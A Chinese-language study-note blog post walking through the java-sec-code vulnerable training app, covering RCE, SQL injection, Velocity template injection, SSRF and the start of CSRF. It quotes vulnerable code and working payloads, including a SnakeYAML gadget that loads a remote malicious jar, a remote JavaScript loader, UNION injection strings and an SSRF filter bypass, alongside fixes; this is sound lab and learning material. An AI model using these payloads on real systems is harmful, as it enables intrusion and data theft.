---
title: java-sec-code
date: 2025-6-26 20:58:52
tags: java
categories: 学习笔记
---

靶场需访问http://localhost:8080/index

默认账号密码为admin admin123

题目在源码里（亏我找半天）

由于后面环境是docker开的，计算器可能弹不出来

### RCE

#### 1. /rce/runtime/exec

```java
@GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }

```

**命令执行**：通过调用 `Runtime.getRuntime().exec(cmd)` 执行传入的命令，这会启动一个新的子进程来执行该命令。

**输入流处理**：使用 `BufferedInputStream` 和 `BufferedReader` 从子进程的标准输出流中读取命令执行的结果。这些结果会被累积到一个 `StringBuilder` 中。

**异常捕获**：如果执行过程中发生异常，捕获并返回异常的字符串描述。

**退出码处理**：在命令执行完成后，检查子进程的退出码。如果退出码不为零且为 1，则表示命令执行失败。

**返回结果**：如果命令执行成功，返回命令的输出内容；如果发生错误，则返回错误信息。



我们可以通过Runtime.getRuntime()这个方法来进行命令执行，在该代码里它通过传入cmd变量进行命令执行

```
?cmd=whoami
```

![image-20241206200351163](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png)

#### 2./rce/ProcessBuilder

```java
 @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        StringBuilder sb = new StringBuilder();
        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }

```

**命令执行**： `String[] arrCmd = {"/bin/sh", "-c", cmd};`
通过 `ProcessBuilder` 启动一个新的 shell 进程，执行传入的命令 `cmd`。这里使用 `-c` 选项告诉 shell 执行字符串中的命令。

**启动进程**： `Process p = processBuilder.start();`
启动进程后，获取该进程的标准输出流并读取其内容。

**读取输出**： 通过 `BufferedInputStream` 和 `BufferedReader` 逐行读取进程的输出并存储在 `StringBuilder` 中。

**异常处理**： 如果命令执行失败或抛出异常，会返回异常的字符串表示。



该代码通过get请求传入一个cmd，然后利用ProcessBuilder这个类调用系统进程来命令执行

注意，在windows系统里

```
String[] arrCmd = {"cmd.exe", "/c", cmd};
```

我们需要在源代码中修改，不然命令执行会报错



![image-20241206202436880](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png)

#### 3./rce/jscmd

```java
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }
```

我们可以看到它接收一个名为 `jsurl` 的参数；

然后使用 Nashorn JavaScript 引擎执行传入 URL 所加载的 JavaScript 脚本。

由于命令无回显，我们可以通过报错来判断

shell.js

```
var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("calc.exe");
```

```
/rce/jscmd?jsurl=http://ip/shell.js
```

![image-20250522213856792](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png)

说不存在clac.exe，的确不存在，这说明命令成功执行



#### 4./rce/vuln/yarm

```java
   @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }
```

`SnakeYaml`是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1/yaml-payload.jar"]
  ]]
]

```

jar是我们远程加载的恶意文件，源码如下

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("whoami");
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```

整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。

payload链接：https://github.com/artsploit/yaml-payload

打包为jar

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .

```

![image-20250525193848130](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png)

漏洞修复

```
    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }
```

#### 5./rce/groovy

```java
@GetMapping("groovy")
public void groovyshell(String content) {
    GroovyShell groovyShell = new GroovyShell();
    groovyShell.evaluate(content);
}

```

Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。

执行命令

```
/rce/groovy?content="calc.exe".execute()
```

![image-20250525195244895](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png)

由于靶场是在docker搭建的，所以弹不出计算器，会提示不存在这个文件



### SQL注入

#### 1./sqli/jdbc/vuln

```java
    @RequestMapping("/jdbc/vuln")
    public String jdbc_sqli_vul(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();

        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connect to database successfully.");

            // sqli vuln code
            Statement statement = con.createStatement();
            String sql = "select * from users where username = '" + username + "'";
            logger.info(sql);
            ResultSet rs = statement.executeQuery(sql);

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }
            rs.close();
            con.close();


        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }

```

漏洞成因：直接插入username，造成sql注入

```java
 String sql = "select * from users where username = '" + username + "'";
```

测试

```
?username=-1' union select 1,database(),3,4--+
```

![image-20250525202433620](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png)

防护

```java
 
            // fix code
            String sql = "select * from users where username = ?";
            PreparedStatement st = con.prepareStatement(sql);
            st.setString(1, username);

```



#### 2./sqli/jdbc/ps/vuln

```java
@RequestMapping("/jdbc/ps/vuln")
    public String jdbc_ps_vuln(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();
        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connecting to Database successfully.");

            String sql = "select * from users where username = '" + username + "'";
            PreparedStatement st = con.prepareStatement(sql);

            logger.info(st.toString());
            ResultSet rs = st.executeQuery();

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }

            rs.close();
            con.close();

        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
            e.printStackTrace();
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }
```

漏洞成因：预处理语句在sql语句之后，没起到防护的作用

```
String sql = "select * from users where username = '" + username + "'";
PreparedStatement st = con.prepareStatement(sql);
```

![image-20250525203533438](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png)



#### 3./sqli/mybatis/vuln01

```java
    @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

我们来看findByUserNameVuln01

```java
@Select("select * from users where username = '${username}'")
    List<User> findByUserNameVuln01(@Param("username") String username);

```

这里用到的是MyBatis框架，用来指定 SQL 查询语句。**`${username}`**：在这里，`username` 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png)

修复代码：

```
@Select("select * from users where username = #{username}")
```

![image-20250525210117585](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png)

#### 4./sqli/mybatis/vuln02

```java
    @GetMapping("/mybatis/vuln02")
    public List<User> mybatisVuln02(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln02(username);
    }
```

我们来看findByUserNameVuln02

```java
List<User> findByUserNameVuln02(String username);
```

这里去掉了映射关系，不影响漏洞存在，仍然可以使用之前payload

![image-20250525211935573](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png)



#### 5./sqli/mybatis/orderby/vuln03

```
 @GetMapping("/mybatis/orderby/vuln03")
    public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
        return userMapper.findByUserNameVuln03(sort);
    }

```

我们来看findByUserNameVuln03

```
List<User> findByUserNameVuln03(@Param("order") String order);
```

使用了MyBatis框架中的order字段，换用下面方法进行注入：

```
?sort=id desc--+
```

![image-20250525214518039](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png)



#### sql注入修复与防护

1.预编译

```java
String sql = "select * from users where username = ?";
PreparedStatement st = con.prepareStatement(sql);

```

2.waf

```java
 private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
 public static String sqlFilter(String sql) {
        if (!FILTER_PATTERN.matcher(sql).matches()) {
            return null;
        }
        return sql;
    

```

3.MyBatis防护

```
@Select("select * from users where username = #{username}")
```



### SSTI

#### /ssti/velocity

```java
  @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}

```

[Apache Velocity](https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=Apache+Velocity&zhida_source=entity)是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和[上下文数据](https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=上下文数据&zhida_source=entity)结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用

模版注入问题各个语言斗鱼，但这里只用到了velocity，除了velocity，thymeleaf等都是会有ssti问题



**Velocity.evaluate**

**方法介绍**

Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：

```text
public static void evaluate(Context context, Writer writer, String templateName, String template)
```

参数说明：

- Context context：提供模板所需的数据上下文，可以包含多个键值对
- Writer writer：输出流，用于写入生成的内容
- String templateName：模板的名称，通常用于调试信息中
- String template：要评估的模板字符串

我们构造如下payload

```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
```

![image-20250527201721864](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png)



### SSRF

#### 1./ssrf/urlConnection/vuln 

```java
    @RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
    public String URLConnectionVuln(String url) {
        return HttpUtils.URLConnection(url);
    }

```

我们来看URLConnection

```java
    public static String URLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
```

这里我们可以用文件读取协议file://实现访问

![image-20250527205331156](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png)



#### 2./ssrf/HttpURLConnection/vuln

```java
    @GetMapping("/HttpURLConnection/vuln")
    public String httpURLConnectionVuln(@RequestParam String url) {
        return HttpUtils.HttpURLConnection(url);
    }
```

我们来看HttpURLConnection

```java
    public static String HttpURLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (IOException e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
```

这里用HttpURLConnection做了强转，限制只能用http/htps协议，但可以访问内网其他主机

![image-20250527210533999](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png)

访问到了首页



#### 3./ssrf/openStream

```java
    @GetMapping("/openStream")
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try {
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
            // download
            response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) > 0) {
                outputStream.write(bytes, 0, length);
            }

        } catch (Exception e) {
            logger.error(e.toString());
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            if (outputStream != null) {
                outputStream.close();
            }
        }
    }
```

可以通过这个路由实现任意文件下载：

![image-20250527213236260](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png)

#### 4./ssrf/HttpSyncClients/vuln

```java
 @GetMapping("/HttpSyncClients/vuln")
    public String HttpSyncClients(@RequestParam("url") String url) {
        return HttpUtils.HttpAsyncClients(url);
    }
```

我们来看HttpAsyncClients

```java
    public static String HttpAsyncClients(String url) {
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try {
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future<HttpResponse> future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            return e.getMessage();
        } finally {
            try {
                httpclient.close();
            } catch (Exception e) {
                logger.error(e.getMessage());
            }
        }
    }
```

我们发现没有对url进行检查，所以可以使用ssrf

![image-20250527213854753](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png)

#### 5./ssrf/restTemplate/vuln1

```java
    @GetMapping("/restTemplate/vuln1")
    public String RestTemplateUrlBanRedirects(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttpBanRedirects(url, headers);
    }
```

这段代码使用 **Spring RestTemplate** 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问

注：为什么需要加个/login

因为http://60.205.158.87:8080/会默认跳转到/login，而代码禁止了重定向

![image-20250527214625396](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png)



既然已经禁止了重定向（Redirect），为什么 SSRF 仍然可能发生？

------

一、什么是 SSRF？

**SSRF（Server-Side Request Forgery）**，即服务器端请求伪造。攻击者控制一个参数，让服务器主动去访问一个由他指定的 URL，从而达到探测内网、打数据库、访问云元数据服务（如 AWS 的 `169.254.169.254`）等目的。

**核心问题：不是重定向，而是“服务器能不能发出请求”。**

------

二、禁止重定向 vs SSRF 的区别

你禁止的是 **HTTP 3xx 重定向**，比如：

```
用户访问 http://example.com => 返回 302 Location: http://malicious.com/internal
```

这时候如果自动跟随重定向，就会去访问 `http://malicious.com/internal`。禁用重定向只防止了这种 **间接跳转 SSRF**。

✅ **禁止重定向确实防止了这种“跳转型 SSRF”。**

------

但是，**普通 SSRF 根本不依赖重定向！**

比如你直接访问这个地址：

```
http://127.0.0.1:3306/
http://169.254.169.254/latest/meta-data/
http://localhost:8080/actuator/env
```

这些 URL **根本不会返回 3xx 重定向**，它们是直接请求目标服务，获取响应。

在你当前的代码中：

```
httpService.RequestHttpBanRedirects(url, headers);
```

如果攻击者传的就是一个直连目标，比如：

```
?url=http://127.0.0.1:8080/
```

你不管重定向不重定向，**请求都会直接发出去**，SSRF 就发生了。



#### 6./ssrf/restTemplate/vuln2

```java
   @GetMapping("/restTemplate/vuln2")
    public String RestTemplateUrl(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    }

```

这串代码没有禁止重定向，我们可以直接SSRF

![image-20250528192945371](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png)

#### 7./ssrf/hutool/vuln

```java
@GetMapping("/hutool/vuln")
public String hutoolHttp(String url){
    return HttpUtil.get(url);
}

```

这个库也能ssrf，但禁止了重定向

![image-20250528194858386](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png)

8./ssrf/denrebind/vuln

```java
@GetMapping("/dnsrebind/vuln")
public String DnsRebind(String url) {
    java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
        return "Dangerous url";
    }
    return HttpUtil.get(url);
}

```

来看checkSSRFWithoutRedirect

```java
 /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }

```

来看isInternalIpByUrl函数

```java
public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }

```

添加了IP检查，修改一下dns解析即可绕过，方法如下：

给本地的hosts文件添加一条解析记录：

```
192.168.1.43 www.baidu.com
```



#### 8./ssrf/dnsrebind/vuln

漏洞代码

```java
@GetMapping("/dnsrebind/vuln")
public String DnsRebind(String url) {
    java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
        return "Dangerous url";
    }
    return HttpUtil.get(url);
}

```

我们来看checkSSRFWithoutRedirect函数

```java
 /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }

```

`isInternalIpByUrl`函数：

```
public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }

```

添加了IP检查，修改一下dns解析即可绕过，方法如下：

给本地的hosts文件添加一条解析记录：

```
192.168.1.43 www.baidu.com
```

然后就可以实现ssrf



#### ssrf的修复与防护

（1）限制协议使用

```java
    @GetMapping("/urlConnection/sec")
    public String URLConnectionSec(String url) {

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) {
            return "[-] SSRF check failed";
        }

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }
```

isHttp函数

```java
 public static boolean isHttp(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }

```

会检查 `url` 是否是 `http://` 或 `https://` 协议，如果不是则直接返回 `"[-] SSRF check failed"`，防止 `file://`、`ftp://`、`gopher://` 等协议的 SSRF 利用

![image-20250724085008108](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png)



（2）限制文件访问

```java
   @GetMapping("/ImageIO/sec")
    public String ImageIO(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "ImageIO ssrf test";
    }

```

`imageIO`函数：

```java
public static void imageIO(String url) {
        try {
            URL u = new URL(url);
            ImageIO.read(u); // send request
        } catch (IOException e) {
            logger.error(e.getMessage());
        }

    }

```



（3）http请求检查

方法1：

```java
    @GetMapping("/okhttp/sec")
    public String okhttp(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

`okhttp`函数：

```java
public static String okhttp(String url) throws IOException {
    OkHttpClient client = new OkHttpClient();
    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
    return client.newCall(ok_http).execute().body().string();
}

```



方法2：

```java
 @GetMapping("/httpclient/sec")
    public String HttpClient(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

`httpClient`函数：

```java
public static String httpClient(String url) {

        StringBuilder result = new StringBuilder();

        try {

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }

            return result.toString();

        } catch (Exception e) {
            return e.getMessage();
        }
    }

```



方法3：

```java
@GetMapping("/commonsHttpClient/sec")
public String commonsHttpClient(@RequestParam String url) {

    try {
        SecurityUtil.startSSRFHook();
        return HttpUtils.commonHttpClient(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }

}

```

`commonHttpClient`函数：

```java
    public static String commonHttpClient(String url) {

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try {
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        } catch (IOException e) {
            return "Error: " + e.getMessage();
        } finally {
            // Release the connection.
            method.releaseConnection();
        }
    }

```



方法4：

```
    @GetMapping("/Jsoup/sec")
    public String Jsoup(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

Jsoup函数

```java
   public static String Jsoup(String url) {
        try {
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie("name", "joychou") // request cookies
                    .execute().parse();
            return doc.outerHtml();
        } catch (IOException e) {
            return e.getMessage();
        }
    }

```

方法5：

```java
  @GetMapping("/IOUtils/sec")
    public String IOUtils(String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "IOUtils ssrf test";
    }

```

`IOUtils`函数

```java
  public static void IOUtils(String url) {
        try {
            IOUtils.toByteArray(URI.create(url));
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
    }

```

| 特性/框架              | **OkHttp**                       | **Apache HttpClient 4.x**      | **Commons HttpClient 3.x**         | **Jsoup**                  | **IOUtils + URLConnection**       |
| ---------------------- | -------------------------------- | ------------------------------ | ---------------------------------- | -------------------------- | --------------------------------- |
| **主要定位**           | 现代高性能 HTTP 客户端           | 企业常用 HTTP 客户端           | 老版本 HTTP 客户端（已废弃）       | 网页抓取 + HTML 解析       | 简单流读取工具                    |
| **支持协议**           | HTTP/HTTPS（默认拒绝 file://）   | HTTP/HTTPS（默认拒绝 file://） | HTTP/HTTPS（部分场景支持 file://） | HTTP/HTTPS/FILE            | HTTP/HTTPS/FILE/GOPHER 等         |
| **是否跟随重定向**     | ✅ 默认跟随，可禁用               | ✅ 默认跟随，可禁用             | ✅ 默认跟随，可禁用                 | ✅ 默认跟随                 | ✅ 默认跟随                        |
| **连接池**             | ✅ 内置复用连接池                 | ✅ 可配置连接池                 | ❌ 无                               | ❌ 无                       | ❌ 每次新建连接                    |
| **超时设置**           | ✅ 支持连接/读超时                | ✅ 支持连接/读超时              | ❌ 配置复杂，易忽略                 | ✅ 可配置超时               | ❌ 默认无限等待                    |
| **HTTP/2 支持**        | ✅ 支持                           | ❌ 不支持（需额外模块）         | ❌ 不支持                           | ❌ 不支持                   | ❌ 不支持                          |
| **API 复杂度**         | 简单，链式调用                   | 相对复杂，配置灵活             | 老旧 API，繁琐                     | 最简单                     | 最原始                            |
| **维护情况**           | 活跃（Square 维护）              | 活跃（Apache 维护）            | ❌ 已停止维护                       | 活跃（Jsoup 团队）         | JDK 自带，无新特性                |
| **SSRF 风险**          | **低**（默认禁止 file://）       | **低**（默认禁止 file://）     | 中（可能支持 file://）             | **高**（默认支持 file://） | **高**（支持 file://、gopher://） |
| **适用场景**           | 通用 HTTP 请求、API 调用、移动端 | 企业后端、复杂 HTTP 请求       | 维护遗留系统                       | 爬虫、HTML 解析            | 小工具快速读取流                  |
| **是否推荐新项目使用** |                                  |                                |                                    |                            |                                   |

**总结**

- **OkHttp** 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。
- **HttpClient** 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。
- **CommonHttpClient** 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。
- **Jsoup** 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。
- **IOUtils** 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。

（4）核心SSRF防护代码

修复代码：

```
public class SocketHook {

    public static void startHook() throws IOException {
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try{
            Socket.setSocketImplFactory(new SocketHookFactory());
        }catch (SocketException ignored){
        }
    }

    public static void stopHook(){
        SocketHookFactory.setHook(false);
    }
}
java复制代码123456789101112131415
```

**功能分析**：

- `startHook()`

  :

  - 启动 `SocketHook`，对所有新创建的 `Socket` 应用自定义行为。核心是通过 `Socket.setSocketImplFactory()` 来设置一个新的 `Socket` 工厂。
  - 可能用于在 `Socket` 连接期间监控、修改、或审查数据流量。

- `stopHook()`

  :

  - 关闭 `SocketHook`，将 `SocketHookFactory` 中的钩子状态关闭，停止对新 `Socket` 实例的自定义行为。

**应用场景**：

- **安全防护**：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。
- **网络审计**：可用于监控网络流量，以记录或分析 `Socket` 通信内容。
- **调试/测试**：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。



### CSRF

原理：

CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。

